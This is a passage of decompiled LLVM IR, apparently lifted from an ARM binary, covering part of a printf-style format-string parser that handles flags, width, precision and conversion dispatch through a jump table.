thread-pre-split:                                 ; preds = %dec_label_pc_1190c, %bb142
  %v0_11920 = phi i32 [ 0, %bb142 ], [ %., %dec_label_pc_1190c ]
  %v2_11920 = icmp eq i32 %v0_11920, 0
  %v0_11954 = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_11920, label %dec_label_pc_11954, label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %thread-pre-split
  %v2_11954 = icmp eq i32 %v0_11954, 0
  %v1_1192c = add i32 %v0_11968, 1
  store i32 %v1_1192c, i32* %r0.global-to-local, align 4
  br i1 %v2_11954, label %dec_label_pc_11d00, label %dec_label_pc_11934

dec_label_pc_11934:                               ; preds = %dec_label_pc_11928
  %v2_11934 = sub i32 %v0_11918, %v0_11954
  %v4_11934 = xor i32 %v0_11954, %v0_11918
  %v5_11934 = xor i32 %v2_11934, %v0_11918
  %v6_11934 = and i32 %v5_11934, %v4_11934
  %v7_11934 = icmp slt i32 %v6_11934, 0
  %v8_11934 = icmp slt i32 %v2_11934, 0
  %v9_11934 = icmp eq i32 %v0_11918, %v0_11954
  %v3_11938 = xor i1 %v8_11934, %v7_11934
  %v4_11938 = or i1 %v9_11934, %v3_11938
  br i1 %v4_11938, label %dec_label_pc_11948, label %bb143

bb143:                                            ; preds = %dec_label_pc_11934
  store i32 %v0_11918, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11948

dec_label_pc_11944:                               ; preds = %dec_label_pc_11968, %dec_label_pc_11970
  %v0_11944 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_11944, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %bb143, %dec_label_pc_11934, %dec_label_pc_11944
  %v0_11948 = phi i32 [ %v0_11900, %dec_label_pc_11944 ], [ %v1_1192c, %dec_label_pc_11934 ], [ %v1_1192c, %bb143 ]
  %stack_var_-44.2 = phi i32 [ %stack_var_-44.1, %dec_label_pc_11944 ], [ %v0_11918, %dec_label_pc_11934 ], [ %v0_11918, %bb143 ]
  store i32 %v0_11948, i32* %r6.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  %v2_11984.pre = load i8*, i8** %stack_var_-120, align 4
  %v3_11984 = ptrtoint i8* %v2_11984.pre to i32
  br label %dec_label_pc_11984

dec_label_pc_11954:                               ; preds = %thread-pre-split
  %tmp144 = icmp slt i32 %v0_11954, 1
  br i1 %tmp144, label %dec_label_pc_11968, label %dec_label_pc_1195c

dec_label_pc_1195c:                               ; preds = %dec_label_pc_11954
  %v7_1195c = icmp eq i8 %v2_118e8, 109
  br i1 %v7_1195c, label %dec_label_pc_119cc, label %dec_label_pc_11d00

dec_label_pc_11968:                               ; preds = %dec_label_pc_11954
  %tmp181 = icmp ugt i32 %v0_11968, %v0_11900
  br i1 %tmp181, label %dec_label_pc_11970, label %dec_label_pc_11944

dec_label_pc_11970:                               ; preds = %dec_label_pc_11968
  %v1_11970 = inttoptr i32 %v0_11900 to i8*
  %v2_11970 = load i8, i8* %v1_11970, align 1
  %v3_11970 = zext i8 %v2_11970 to i32
  store i32 %v3_11970, i32* %r3.global-to-local, align 4
  %v7_11974 = icmp eq i8 %v2_11970, 48
  br i1 %v7_11974, label %dec_label_pc_11944, label %bb145

bb145:                                            ; preds = %dec_label_pc_11970
  %v1_11978 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_11978, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_119cc

dec_label_pc_11984.loopexit:                      ; preds = %dec_label_pc_1198c
  %v1_11998 = load i32, i32* @r4, align 4
  %v3_11998 = or i32 %v1_11998, %v0_119ac
  store i32 %v3_11998, i32* @r4, align 4
  %v2_1199c = add i32 %v0_1199074, 1
  store i32 %v2_1199c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11984

dec_label_pc_11984:                               ; preds = %dec_label_pc_11984.loopexit, %dec_label_pc_11948
  %v0_1199074 = phi i32 [ %v2_1199c, %dec_label_pc_11984.loopexit ], [ %v0_11948, %dec_label_pc_11948 ]
  store i32 %v3_11984, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_11990 = inttoptr i32 %v0_1199074 to i8*
  br label %dec_label_pc_1198c

dec_label_pc_1198c:                               ; preds = %dec_label_pc_119a4, %dec_label_pc_11984
  %v0_119ac = phi i32 [ %v2_119ac, %dec_label_pc_119a4 ], [ 1, %dec_label_pc_11984 ]
  %v0_1198c = phi i32 [ %v5_1198c, %dec_label_pc_119a4 ], [ %v3_11984, %dec_label_pc_11984 ]
  %v1_1198c = inttoptr i32 %v0_1198c to i8*
  %v2_1198c = load i8, i8* %v1_1198c, align 1
  %v3_1198c = zext i8 %v2_1198c to i32
  store i32 %v3_1198c, i32* %r2.global-to-local, align 4
  %v5_1198c = add i32 %v0_1198c, 1
  store i32 %v5_1198c, i32* %r0.global-to-local, align 4
  %v2_11990 = load i8, i8* %v1_11990, align 1
  %v3_11990 = zext i8 %v2_11990 to i32
  store i32 %v3_11990, i32* %r3.global-to-local, align 4
  %v9_11994 = icmp eq i8 %v2_11990, %v2_1198c
  br i1 %v9_11994, label %dec_label_pc_11984.loopexit, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %dec_label_pc_1198c
  %v1_119a4 = inttoptr i32 %v5_1198c to i8*
  %v2_119a4 = load i8, i8* %v1_119a4, align 1
  %v3_119a4 = zext i8 %v2_119a4 to i32
  store i32 %v3_119a4, i32* %r3.global-to-local, align 4
  %v2_119a8 = icmp eq i8 %v2_119a4, 0
  %v2_119ac = mul i32 %v0_119ac, 2
  store i32 %v2_119ac, i32* %r1.global-to-local, align 4
  br i1 %v2_119a8, label %dec_label_pc_119b4, label %dec_label_pc_1198c

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a4
  %v1_119b4 = add i32 %v0_1199074, -1
  %v2_119b4 = inttoptr i32 %v1_119b4 to i8*
  %v3_119b4 = load i8, i8* %v2_119b4, align 1
  %v7_119b8 = icmp eq i8 %v3_119b4, 37
  %v0_119bc = load i32, i32* @r4, align 4
  %v1_119bc = and i32 %v0_119bc, 10
  store i32 %v1_119bc, i32* %r3.global-to-local, align 4
  %v4_119c0 = udiv i32 %v1_119bc, 2
  %v5_119c0 = sub nuw nsw i32 -1, %v4_119c0
  %v6_119c0 = and i32 %v0_119bc, %v5_119c0
  store i32 %v6_119c0, i32* @r4, align 4
  br i1 %v7_119b8, label %dec_label_pc_119c8, label %dec_label_pc_11880

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119b4
  %v0_119c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_119c8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_119cc

dec_label_pc_119cc:                               ; preds = %bb145, %dec_label_pc_11900, %dec_label_pc_1195c, %dec_label_pc_119c8
  %v1_11a0c = phi i32 [ %v0_1199074, %dec_label_pc_119c8 ], [ %v0_11968, %bb145 ], [ %v0_11968, %dec_label_pc_1195c ], [ %v0_11968, %dec_label_pc_11900 ]
  %v0_11a08 = phi i32 [ %v5_1198c, %dec_label_pc_119c8 ], [ %v0_11900, %bb145 ], [ %v0_11900, %dec_label_pc_1195c ], [ %v0_11900, %dec_label_pc_11900 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_119c8 ], [ %stack_var_-44.1, %bb145 ], [ %stack_var_-44.1, %dec_label_pc_1195c ], [ %stack_var_-44.1, %dec_label_pc_11900 ]
  %v1_119cc = inttoptr i32 %v0_11a08 to i8*
  %v2_119cc = load i8, i8* %v1_119cc, align 1
  %v3_119cc = zext i8 %v2_119cc to i32
  store i32 %v3_119cc, i32* %r3.global-to-local, align 4
  %v7_119d0 = icmp eq i8 %v2_119cc, 42
  br i1 %v7_119d0, label %dec_label_pc_119d8, label %dec_label_pc_11a18

dec_label_pc_119d8:                               ; preds = %dec_label_pc_119cc
  %v0_119d8 = load i32, i32* %fp.global-to-local, align 4
  %v2_119d8 = icmp eq i32 %v0_119d8, 0
  br i1 %v2_119d8, label %dec_label_pc_11a08, label %dec_label_pc_119e0

dec_label_pc_119e0:                               ; preds = %dec_label_pc_119d8
  %v1_119e0 = inttoptr i32 %v1_11a0c to i8*
  %v2_119e0 = load i8, i8* %v1_119e0, align 1
  %v3_119e0 = zext i8 %v2_119e0 to i32
  store i32 %v3_119e0, i32* %r3.global-to-local, align 4
  %v7_119e4 = icmp eq i8 %v2_119e0, 36
  br i1 %v7_119e4, label %dec_label_pc_119ec, label %dec_label_pc_11d00

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119e0
  %v0_119ec = load i32, i32* %r1.global-to-local, align 4
  %tmp146 = icmp slt i32 %v0_119ec, 1
  br i1 %tmp146, label %dec_label_pc_11d00, label %dec_label_pc_119f4

dec_label_pc_119f4:                               ; preds = %dec_label_pc_119ec
  %v0_119f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_119f8 = load i32, i32* %sb.global-to-local, align 4
  %v3_119f8 = mul i32 %v1_119f8, %v0_119f8
  %v4_119f8 = add i32 %v3_119f8, %v3_1188c.pre-phi
  store i32 %v4_119f8, i32* %r3.global-to-local, align 4
  %v1_119fc = add i32 %v1_11a0c, 1
  store i32 %v1_119fc, i32* %r6.global-to-local, align 4
  %v2_11a00 = add i32 %v4_119f8, -12
  %v3_11a00 = inttoptr i32 %v2_11a00 to i32*
  store i32 %v0_119ec, i32* %v3_11a00, align 4
  br label %dec_label_pc_11a14

dec_label_pc_11a08:                               ; preds = %dec_label_pc_119d8
  %v1_11a08 = add i32 %v0_11a08, 1
  store i32 %v1_11a08, i32* %r3.global-to-local, align 4
  %v9_11a0c = icmp eq i32 %v1_11a08, %v1_11a0c
  br i1 %v9_11a0c, label %dec_label_pc_11a14, label %dec_label_pc_11d00

dec_label_pc_11a14:                               ; preds = %dec_label_pc_11a08, %dec_label_pc_119f4
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11a18

dec_label_pc_11a18:                               ; preds = %dec_label_pc_119cc, %dec_label_pc_11a14
  %v0_11a18 = load i32, i32* %r8.global-to-local, align 4
  %v2_11a18 = icmp eq i32 %v0_11a18, 0
  br i1 %v2_11a18, label %dec_label_pc_11a24, label %dec_label_pc_11a44.loopexit

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a18
  %v0_11a24 = load i32, i32* %r6.global-to-local, align 4
  %v1_11a24 = inttoptr i32 %v0_11a24 to i8*
  %v2_11a24 = load i8, i8* %v1_11a24, align 1
  %v3_11a24 = zext i8 %v2_11a24 to i32
  store i32 %v3_11a24, i32* %r3.global-to-local, align 4
  %v7_11a28 = icmp eq i8 %v2_11a24, 46
  br i1 %v7_11a28, label %.thread19, label %dec_label_pc_11a3c

.thread19:                                        ; preds = %dec_label_pc_11a24
  %v2_11a2c = add i32 %v0_11a24, 1
  store i32 %v2_11a2c, i32* %r6.global-to-local, align 4
  %v1_11a30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11a30, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11880

dec_label_pc_11a3c:                               ; preds = %dec_label_pc_11a24
  %v0_11a3c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11a3c, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44.loopexit:                      ; preds = %dec_label_pc_11a18
  %v1_11a1c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_11a1c, i32* @r5, align 4
  %v0_11a50.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a44.loopexit, %dec_label_pc_11a3c
  %v0_11a50.pre = phi i32 [ %v0_11a50.pre.pre, %dec_label_pc_11a44.loopexit ], [ %v0_11a24, %dec_label_pc_11a3c ]
  store i32 -36128, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1a698.230 to i32), i32* %r1.global-to-local, align 4
  %v1_11a50 = inttoptr i32 %v0_11a50.pre to i8*
  br label %dec_label_pc_11a4c

dec_label_pc_11a4c:                               ; preds = %dec_label_pc_11a60, %dec_label_pc_11a44
  %v0_11a60 = phi i32 [ %v1_11a60, %dec_label_pc_11a60 ], [ ptrtoint ([9 x i8]* @global_var_1a698.230 to i32), %dec_label_pc_11a44 ]
  %v1_11a4c = inttoptr i32 %v0_11a60 to i8*
  %v2_11a4c = load i8, i8* %v1_11a4c, align 1
  %v3_11a4c = zext i8 %v2_11a4c to i32
  store i32 %v3_11a4c, i32* %r2.global-to-local, align 4
  %v2_11a50 = load i8, i8* %v1_11a50, align 1
  %v3_11a50 = zext i8 %v2_11a50 to i32
  store i32 %v3_11a50, i32* %r3.global-to-local, align 4
  %v9_11a54 = icmp eq i8 %v2_11a50, %v2_11a4c
  br i1 %v9_11a54, label %bb147, label %dec_label_pc_11a60

bb147:                                            ; preds = %dec_label_pc_11a4c
  %v2_11a58 = add i32 %v0_11a50.pre, 1
  store i32 %v2_11a58, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11a6c

dec_label_pc_11a60:                               ; preds = %dec_label_pc_11a4c
  %v1_11a60 = add i32 %v0_11a60, 1
  %v2_11a60 = inttoptr i32 %v1_11a60 to i8*
  %v3_11a60 = load i8, i8* %v2_11a60, align 1
  %v4_11a60 = zext i8 %v3_11a60 to i32
  store i32 %v4_11a60, i32* %r3.global-to-local, align 4
  store i32 %v1_11a60, i32* %r1.global-to-local, align 4
  %v2_11a64 = icmp eq i8 %v3_11a60, 0
  br i1 %v2_11a64, label %dec_label_pc_11a6c, label %dec_label_pc_11a4c

dec_label_pc_11a6c:                               ; preds = %dec_label_pc_11a60, %bb147
  %v1_11a90 = phi i32 [ %v2_11a58, %bb147 ], [ %v0_11a50.pre, %dec_label_pc_11a60 ]
  %v1_11a8c = phi i32 [ %v0_11a60, %bb147 ], [ %v1_11a60, %dec_label_pc_11a60 ]
  %v2_11a74 = sub i32 %v1_11a8c, ptrtoint ([9 x i8]* @global_var_1a698.230 to i32)
  store i32 %v2_11a74, i32* %r3.global-to-local, align 4
  %v8_11a7c = icmp sgt i32 %v2_11a74, 1
  br i1 %v8_11a7c, label %.thread23, label %dec_label_pc_11a80

dec_label_pc_11a80:                               ; preds = %dec_label_pc_11a6c
  %v1_11a80 = inttoptr i32 %v1_11a90 to i8*
  %v2_11a80 = load i8, i8* %v1_11a80, align 1
  %v3_11a80 = zext i8 %v2_11a80 to i32
  store i32 %v3_11a80, i32* %r2.global-to-local, align 4
  %v1_11a84 = inttoptr i32 %v1_11a8c to i8*
  %v2_11a84 = load i8, i8* %v1_11a84, align 1
  %v3_11a84 = zext i8 %v2_11a84 to i32
  store i32 %v3_11a84, i32* %r3.global-to-local, align 4
  %v9_11a88 = icmp eq i8 %v2_11a80, %v2_11a84
  br i1 %v9_11a88, label %bb148, label %.thread23

bb148:                                            ; preds = %dec_label_pc_11a80
  %v2_11a8c = add i32 %v1_11a8c, 9
  store i32 %v2_11a8c, i32* %r1.global-to-local, align 4
  %v2_11a90 = add i32 %v1_11a90, 1
  store i32 %v2_11a90, i32* %r6.global-to-local, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_11a80, %dec_label_pc_11a6c, %bb148
  %v0_11a98 = phi i32 [ %v1_11a8c, %dec_label_pc_11a80 ], [ %v1_11a8c, %dec_label_pc_11a6c ], [ %v2_11a8c, %bb148 ]
  %v0_11a94 = phi i32 [ %v1_11a90, %dec_label_pc_11a80 ], [ %v1_11a90, %dec_label_pc_11a6c ], [ %v2_11a90, %bb148 ]
  %v1_11a94 = inttoptr i32 %v0_11a94 to i8*
  %v2_11a94 = load i8, i8* %v1_11a94, align 1
  %v3_11a94 = zext i8 %v2_11a94 to i32
  store i32 %v3_11a94, i32* %r2.global-to-local, align 4
  %v1_11a98 = add i32 %v0_11a98, 9
  %v2_11a98 = inttoptr i32 %v1_11a98 to i8*
  %v3_11a98 = load i8, i8* %v2_11a98, align 1
  %v4_11a98 = zext i8 %v3_11a98 to i32
  store i32 %v4_11a98, i32* %r3.global-to-local, align 4
  %v2_11a9c = icmp eq i8 %v2_11a94, 0
  %v3_11aa0 = mul nuw nsw i32 %v4_11a98, 256
  store i32 %v3_11aa0, i32* @ip, align 4
  br i1 %v2_11a9c, label %dec_label_pc_11d00, label %dec_label_pc_11aa8

dec_label_pc_11aa8:                               ; preds = %.thread23
  store i32 -36028, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11b34, %dec_label_pc_11aa8
  %v1_11ac4 = phi i32 [ %v1_11b34, %dec_label_pc_11b34 ], [ ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32), %dec_label_pc_11aa8 ]
  %v1_11ab0 = inttoptr i32 %v1_11ac4 to i8*
  %v2_11ab0 = load i8, i8* %v1_11ab0, align 1
  %v3_11ab0 = zext i8 %v2_11ab0 to i32
  store i32 %v3_11ab0, i32* %r3.global-to-local, align 4
  %v9_11ab4 = icmp eq i8 %v2_11ab0, %v2_11a94
  br i1 %v9_11ab4, label %dec_label_pc_11abc, label %dec_label_pc_11b34

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11ab0
  store i32 ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32), i32* %r3.global-to-local, align 4
  %v2_11ac4 = sub i32 %v1_11ac4, ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32)
  store i32 %v2_11ac4, i32* %r1.global-to-local, align 4
  %v7_11acc = icmp slt i32 %v2_11ac4, 18
  br i1 %v7_11acc, label %bb150, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11abc
  %v1_11ad0 = and i32 %v3_11aa0, 1024
  %v2_11ad0 = icmp eq i32 %v1_11ad0, 0
  br i1 %v2_11ad0, label %bb150, label %bb149

bb149:                                            ; preds = %dec_label_pc_11ad0
  %v2_11ad4 = add i32 %v2_11ac4, -2
  store i32 %v2_11ad4, i32* %r1.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %dec_label_pc_11abc, %dec_label_pc_11ad0, %bb149
  %v0_11adc = phi i32 [ %v2_11ac4, %dec_label_pc_11abc ], [ %v2_11ac4, %dec_label_pc_11ad0 ], [ %v2_11ad4, %bb149 ]
  %v1_11adc = load i32, i32* %r7.global-to-local, align 4
  %v2_11adc = add i32 %v1_11adc, 32
  %v3_11adc = inttoptr i32 %v2_11adc to i32*
  store i32 %v0_11adc, i32* %v3_11adc, align 4
  store i32 ptrtoint (i32* @global_var_1a6cc.234 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6cb.235 to i32), i32* %r0.global-to-local, align 4
  %v0_11aec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11ae8

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11ae8, %bb150
  %v0_11ae8 = phi i32 [ %v1_11ae8, %dec_label_pc_11ae8 ], [ ptrtoint (i32* @global_var_1a6cb.235 to i32), %bb150 ]
  %v1_11ae8 = add i32 %v0_11ae8, 1
  %v2_11ae8 = inttoptr i32 %v1_11ae8 to i8*
  %v3_11ae8 = load i8, i8* %v2_11ae8, align 1
  %v4_11ae8 = zext i8 %v3_11ae8 to i32
  store i32 %v4_11ae8, i32* %r3.global-to-local, align 4
  store i32 %v1_11ae8, i32* %r0.global-to-local, align 4
  %v8_11af0 = icmp sgt i32 %v0_11aec.pre, %v4_11ae8
  br i1 %v8_11af0, label %dec_label_pc_11ae8, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11ae8
  %v2_11b00 = sub i32 %v1_11ae8, ptrtoint (i32* @global_var_1a6cc.234 to i32)
  %v2_11b04 = mul i32 %v2_11b00, 2
  store i32 %v2_11b04, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6bc.237 to i32), i32* %r3.global-to-local, align 4
  %v2_11b0c = add i32 %v2_11b04, ptrtoint (i32* @global_var_1a6bc.237 to i32)
  %v3_11b0c = inttoptr i32 %v2_11b0c to i16*
  %v4_11b0c = load i16, i16* %v3_11b0c, align 2
  %v6_11b0c = sext i16 %v4_11b0c to i32
  store i32 %v6_11b0c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a6ac.239 to i32), i32* %r3.global-to-local, align 4
  %v2_11b18 = add i32 %v2_11b04, ptrtoint (i32* @global_var_1a6ac.239 to i32)
  %v3_11b18 = inttoptr i32 %v2_11b18 to i16*
  %v4_11b18 = load i16, i16* %v3_11b18, align 2
  %v6_11b18 = sext i16 %v4_11b18 to i32
  %v1_11b1c = load i32, i32* @ip, align 4
  %v2_11b1c = or i32 %v1_11b1c, %v6_11b0c
  %v2_11b20 = and i32 %v2_11b1c, %v6_11b18
  store i32 %v2_11b20, i32* %r1.global-to-local, align 4
  store i32 -36028, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1a6fc.232 to i32), i32* %r0.global-to-local, align 4
  store i32 %v2_11b20, i32* %stack_var_-72, align 4
  %v0_11b4c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b40

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11ab0
  %v1_11b34 = add i32 %v1_11ac4, 1
  %v2_11b34 = inttoptr i32 %v1_11b34 to i8*
  %v3_11b34 = load i8, i8* %v2_11b34, align 1
  %v4_11b34 = zext i8 %v3_11b34 to i32
  store i32 %v4_11b34, i32* %r3.global-to-local, align 4
  store i32 %v1_11b34, i32* %r0.global-to-local, align 4
  %v2_11b38 = icmp eq i8 %v3_11b34, 0
  br i1 %v2_11b38, label %dec_label_pc_11b40, label %dec_label_pc_11ab0

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b34, %dec_label_pc_11af4
  %v0_11b4c = phi i32 [ %v0_11b4c.pre, %dec_label_pc_11af4 ], [ %v0_11a94, %dec_label_pc_11b34 ]
  %v0_11b48 = phi i32 [ %v1_11b1c, %dec_label_pc_11af4 ], [ %v3_11aa0, %dec_label_pc_11b34 ]
  %v0_11b40 = load i32, i32* @r4, align 4
  %v1_11b40 = and i32 %v0_11b40, 4
  %v1_11b44 = and i32 %v0_11b40, -5
  store i32 %v1_11b44, i32* %r3.global-to-local, align 4
  %v1_11b48 = and i32 %v0_11b48, 3840
  store i32 %v1_11b48, i32* %r2.global-to-local, align 4
  %v1_11b4c = inttoptr i32 %v0_11b4c to i8*
  %v2_11b4c = load i8, i8* %v1_11b4c, align 1
  %v3_11b4c = zext i8 %v2_11b4c to i32
  store i32 %v3_11b4c, i32* %r1.global-to-local, align 4
  %v2_11b50 = or i32 %v1_11b44, %v1_11b48
  store i32 %v2_11b50, i32* %r2.global-to-local, align 4
  %tmp178 = mul nuw nsw i32 %v1_11b40, 4
  %tmp179 = or i32 %tmp178, 32
  %v1_11b5c = load i32, i32* %r7.global-to-local, align 4
  %v2_11b5c = add i32 %v1_11b5c, 20
  %v3_11b5c = inttoptr i32 %v2_11b5c to i32*
  store i32 %tmp179, i32* %v3_11b5c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_11b64 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b64 = load i32, i32* %r7.global-to-local, align 4
  %v2_11b64 = add i32 %v1_11b64, 12
  %v3_11b64 = inttoptr i32 %v2_11b64 to i32*
  store i32 %v0_11b64, i32* %v3_11b64, align 4
  %v0_11b68 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b68 = add i32 %v0_11b68, 4
  %v2_11b68 = inttoptr i32 %v1_11b68 to i32*
  %v3_11b68 = load i32, i32* @r5, align 4
  store i32 %v3_11b68, i32* %v2_11b68, align 4
  %v4_11b68 = add i32 %v0_11b68, 8
  %v5_11b68 = inttoptr i32 %v4_11b68 to i32*
  %v6_11b68 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_11b68, i32* %v5_11b68, align 4
  %v0_11b6c = load i32, i32* %r2.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r7.global-to-local, align 4
  %v2_11b6c = add i32 %v1_11b6c, 16
  %v3_11b6c = inttoptr i32 %v2_11b6c to i32*
  store i32 %v0_11b6c, i32* %v3_11b6c, align 4
  %v0_11b70 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b70 = load i32, i32* %r7.global-to-local, align 4
  %v2_11b70 = add i32 %v1_11b70, 28
  %v3_11b70 = inttoptr i32 %v2_11b70 to i32*
  store i32 %v0_11b70, i32* %v3_11b70, align 4
  %v0_11b74 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b74 = inttoptr i32 %v0_11b74 to i8*
  %v2_11b74 = load i8, i8* %v1_11b74, align 1
  %v3_11b74 = zext i8 %v2_11b74 to i32
  store i32 %v3_11b74, i32* %r2.global-to-local, align 4
  %v2_11b78 = icmp eq i8 %v2_11b74, 0
  br i1 %v2_11b78, label %dec_label_pc_11b80, label %dec_label_pc_11c04

dec_label_pc_11b80:                               ; preds = %dec_label_pc_11b40
  %v0_11b80 = load i32, i32* %r6.global-to-local, align 4
  %v1_11b80 = inttoptr i32 %v0_11b80 to i8*
  %v2_11b80 = load i8, i8* %v1_11b80, align 1
  %v3_11b80 = zext i8 %v2_11b80 to i32
  store i32 %v3_11b80, i32* %r3.global-to-local, align 4
  %v7_11b84 = icmp eq i8 %v2_11b80, 109
  br i1 %v7_11b84, label %.thread27, label %dec_label_pc_11b98

.thread27:                                        ; preds = %dec_label_pc_11b80
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_11b8c = load i32, i32* %r7.global-to-local, align 4
  %v3_11b8c = add i32 %v2_11b8c, 32
  %v4_11b8c = inttoptr i32 %v3_11b8c to i32*
  store i32 20, i32* %v4_11b8c, align 4
  %v1_11b90 = load i32, i32* %r2.global-to-local, align 4
  %v2_11b90 = load i32, i32* %r7.global-to-local, align 4
  %v3_11b90 = add i32 %v2_11b90, 28
  %v4_11b90 = inttoptr i32 %v3_11b90 to i32*
  store i32 %v1_11b90, i32* %v4_11b90, align 4
  br label %dec_label_pc_11c04

dec_label_pc_11b98:                               ; preds = %dec_label_pc_11b80
  store i32 544, i32* %r3.global-to-local, align 4
  %v0_11b9c = load i32, i32* @lr, align 4
  %v2_11b9c = add i32 %v0_11b9c, 544
  %v3_11b9c = inttoptr i32 %v2_11b9c to i32*
  %v4_11b9c = load i32, i32* %v3_11b9c, align 4
  store i32 %v4_11b9c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_11ba4 = load i32, i32* %r7.global-to-local, align 4
  %v2_11ba4 = add i32 %v1_11ba4, 32
  %v3_11ba4 = inttoptr i32 %v2_11ba4 to i32*
  store i32 21, i32* %v3_11ba4, align 4
  %v0_11ba8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_11ba8, i32* @ip, align 4
  %v1_11bac = add i32 %v0_11ba8, 10
  store i32 %v1_11bac, i32* %r0.global-to-local, align 4
  %v0_11bb4.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_11bb4 = inttoptr i32 %v0_11bb4.pre to i8*
  br label %dec_label_pc_11bb0

dec_label_pc_11bb0:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11b98
  %v1_11bc0 = phi i32 [ %v1_11bf4, %dec_label_pc_11bf4 ], [ %v0_11ba8, %dec_label_pc_11b98 ]
  %v1_11bb0 = inttoptr i32 %v1_11bc0 to i8*
  %v2_11bb0 = load i8, i8* %v1_11bb0, align 1
  %v3_11bb0 = zext i8 %v2_11bb0 to i32
  store i32 %v3_11bb0, i32* %r2.global-to-local, align 4
  %v2_11bb4 = load i8, i8* %v1_11bb4, align 1
  %v3_11bb4 = zext i8 %v2_11bb4 to i32
  store i32 %v3_11bb4, i32* %r3.global-to-local, align 4
  %v9_11bb8 = icmp eq i8 %v2_11bb0, %v2_11bb4
  br i1 %v9_11bb8, label %dec_label_pc_11bc0, label %dec_label_pc_11bf4

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11bb0
  %v2_11bc0 = sub i32 %v1_11bc0, %v0_11ba8
  store i32 %v2_11bc0, i32* %r3.global-to-local, align 4
  %v0_11bc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_11bc8 = add i32 %v0_11bc8, 4
  store i32 %v1_11bc8, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_11bd4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_11bd4, i32* %r2.global-to-local, align 4
  %v4_11bd8 = mul i32 %v2_11bc0, 4
  %v5_11bd8 = add i32 %v4_11bd8, ptrtoint (i32* @global_var_2977c.242 to i32)
  %v6_11bd8 = inttoptr i32 %v5_11bd8 to i32*
  %v7_11bd8 = load i32, i32* %v6_11bd8, align 4
  store i32 %v7_11bd8, i32* @ip, align 4
  store i32 72676, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_11bd8)
  %v0_11be4 = load i32, i32* %r0.global-to-local, align 4
  %v1_11be8 = load i32, i32* %r7.global-to-local, align 4
  %v2_11be8 = add i32 %v1_11be8, 28
  %v3_11be8 = inttoptr i32 %v2_11be8 to i32*
  store i32 %v0_11be4, i32* %v3_11be8, align 4
  %v7_11bec = icmp sgt i32 %v0_11be4, 5
  br i1 %v7_11bec, label %dec_label_pc_11d00, label %dec_label_pc_11c04

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11bb0
  %v1_11bf4 = add i32 %v1_11bc0, 1
